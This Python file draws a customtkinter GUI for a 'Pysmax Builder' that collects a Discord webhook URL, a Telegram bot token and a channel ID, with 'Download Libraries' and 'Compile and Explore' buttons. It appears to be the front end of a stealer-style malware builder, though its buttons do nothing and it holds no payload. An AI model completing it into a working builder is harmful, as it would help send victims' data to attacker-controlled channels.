from customtkinter import *
from tkinter import messagebox 
my_width = 1  
window = None  

def exit_():
	message = messagebox.askquestion(title="pysmax builder",message="are you sure you want to exit?")
	if message=="yes":
		exit()
	else:
		pass
def start_():
	
    global window, my_width
    #Window
    window = CTk()
    window.title("Pysmax Builder")
    window.geometry("1000x500+200+100")
    window.configure(fg_color="black")
    
    #labels,frame
    logo = CTkLabel(master=window, text="    Pysmax\n", text_color="purple", font=("bold", 40))
    logo2 = CTkLabel(master=window, text="\nBuilder", text_color="white", font=("bold", 40))
    F_ = CTkFrame(master=window, fg_color="black", height=450, width=600,
                  border_width=2, border_color="purple", corner_radius=12)
    
    # Entry fields
    global Discord_webhook_entry,telegram_bot_token,telegram_channel_id
    Discord_webhook_entry = CTkEntry(F_, placeholder_text=" Discord webhook url ", fg_color="black",
                                      border_width=2, border_color="purple", height=50, 
                                      placeholder_text_color="white", corner_radius=12, width=my_width, 
                                      text_color="purple", font=("", 15))
    
    telegram_bot_token = CTkEntry(F_, placeholder_text=" Telegram bot token ", fg_color="black",
                                   border_width=2, border_color="purple", height=50, 
                                   placeholder_text_color="white", corner_radius=12, width=my_width, 
                                   text_color="purple", font=("", 15))
    
    telegram_channel_id = CTkEntry(F_, placeholder_text=" Telegram channel id ", fg_color="black",
                                    border_width=2, border_color="purple", height=50, 
                                    placeholder_text_color="white", corner_radius=12, width=my_width, 
                                    text_color="purple", font=("", 15))
	
    box = CTkComboBox(F_, values=["Discord", "Telegram", "Both"], fg_color="black",
                      text_color="white", border_width=1, border_color="purple", 
                      dropdown_fg_color="purple", corner_radius=12,
                      dropdown_hover_color="black", width=250, height=40,font=("bold",20), button_color="purple")
    button_ = CTkButton(F_,text="Download Libraries",fg_color="black",border_color="purple",border_width=2
                        ,corner_radius=10,bg_color="black",font=("",17),hover_color="purple",width=120,height=50)  
    button_2 = CTkButton(F_,text="Compile and Explore",fg_color="black",border_color="purple",border_width=2
                        ,corner_radius=10,bg_color="black",font=("",17),hover_color="purple",width=120,height=50) 
    exit_button = CTkButton(window,text="Exit",fg_color="black",border_color="purple",border_width=2
                        ,corner_radius=15,bg_color="black",font=("",15),hover_color="red",width=100,height=20,command=exit_)     
    # Pack,places
    box.place(x=-10, y=250)
    box.set("Discord")
    Discord_webhook_entry.place(x=-10, y=60)
    telegram_bot_token.place(x=-10, y=120)
    telegram_channel_id.place(x=-10, y=180)
    F_.pack(side='right', padx=20)
    logo.pack(side='left')
    logo2.pack(side='left',pady=50)
    #350=y
    button_.place(x=150,y=370)
    button_2.place(x=350,y=370)
    exit_button.place(x=1,y=1)
    Start__()

    window.mainloop()

def Start__():
    global my_width
    if my_width < 480:
        my_width += 1
        Discord_webhook_entry.configure(width=my_width)
        telegram_channel_id.configure(width=my_width)
        telegram_bot_token.configure(width=my_width)
        window.after(1, Start__) 

start_()
